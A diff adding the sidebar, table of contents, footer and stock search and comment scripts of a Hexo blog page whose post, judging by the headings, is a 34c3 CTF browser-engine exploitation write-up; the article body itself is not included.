+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/head.png" alt="ama2in9">
+            
+              <p class="site-author-name" itemprop="name">ama2in9</p>
+              <p class="site-description motion-element" itemprop="description">Seeing how far I have been.</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">81</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">33</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/xmzyshypnc" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.piddnad.cn/" title="Piddnad" target="_blank">Piddnad</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://linkleyping.top/" title="Ep" target="_blank">Ep</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://e3pem.github.io/" title="E3pem" target="_blank">E3pem</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://litch1.club/" title="Litch1" target="_blank">Litch1</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://v1ckydxp.github.io/" title="v1cky" target="_blank">v1cky</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://swordfaith.github.io/" title="swordfaith" target="_blank">swordfaith</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://harmoc.com/" title="harmoc" target="_blank">harmoc</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://t3ls.club/" title="t3ls" target="_blank">t3ls</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#34c3-CTF-v9题解"><span class="nav-number">1.</span> <span class="nav-text">34c3 CTF v9题解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#环境搭建"><span class="nav-number">1.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#伪造Properties实现任意地址读写"><span class="nav-number">1.3.</span> <span class="nav-text">伪造Properties实现任意地址读写</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PoC构造"><span class="nav-number">1.3.1.</span> <span class="nav-text">PoC构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#addressOf原语"><span class="nav-number">1.3.2.</span> <span class="nav-text">addressOf原语</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fake-properties"><span class="nav-number">1.3.3.</span> <span class="nav-text">fake properties</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#arbRead-arbWrite原语"><span class="nav-number">1.3.4.</span> <span class="nav-text">arbRead/arbWrite原语</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#leak-wasm-code"><span class="nav-number">1.3.5.</span> <span class="nav-text">leak wasm code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-js"><span class="nav-number">1.3.6.</span> <span class="nav-text">exp.js</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">1.3.7.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fakeArrayBuffer"><span class="nav-number">1.4.</span> <span class="nav-text">fakeArrayBuffer</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#leak-ArrayBuffer-prototype-amp-amp-constructor"><span class="nav-number">1.4.1.</span> <span class="nav-text">leak ArrayBuffer prototype &amp;&amp; constructor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fake-ArrayBuffer-maps"><span class="nav-number">1.4.2.</span> <span class="nav-text">fake ArrayBuffer maps</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fake-ArrayBuffer"><span class="nav-number">1.4.3.</span> <span class="nav-text">fake ArrayBuffer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fakeObj"><span class="nav-number">1.4.4.</span> <span class="nav-text">fakeObj</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#任意地址读写"><span class="nav-number">1.4.5.</span> <span class="nav-text">任意地址读写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-js-1"><span class="nav-number">1.4.6.</span> <span class="nav-text">exp.js</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shrink-Object"><span class="nav-number">1.5.</span> <span class="nav-text">shrink Object</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#内存布局"><span class="nav-number">1.5.1.</span> <span class="nav-text">内存布局</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PoC"><span class="nav-number">1.5.2.</span> <span class="nav-text">PoC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.5.3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用效果"><span class="nav-number">1.6.</span> <span class="nav-text">利用效果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结-1"><span class="nav-number">1.7.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ama2in9</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+  
+    <script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script>
+  
+
+  
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'http://ama2in9.top/2021/05/26/34c3-v9/';
+        this.page.identifier = '2021/05/26/34c3-v9/';
+        this.page.title = '34c3 CTF v9题解';
+        };
+      function loadComments () {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://xmzyshypnc.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      }
+      
+        loadComments();
+      
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: true,
+        appId: 'YbpHIa6XHNsKv4wX2wGjnrK7-gzGzoHsz',
+        appKey: '1fjf9mQl90nKdRPfq1zhDyIE',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        meta:guest,
+        pageSize:'10' || 10,
+        visitor: true
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"live2d-widget-model-hijiki"},"display":{"superSample":2,"width":150,"height":300,"position":"right","hOffset":0,"vOffset":-50},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.2},"log":false,"tagMode":false});</script></body>
+</html>
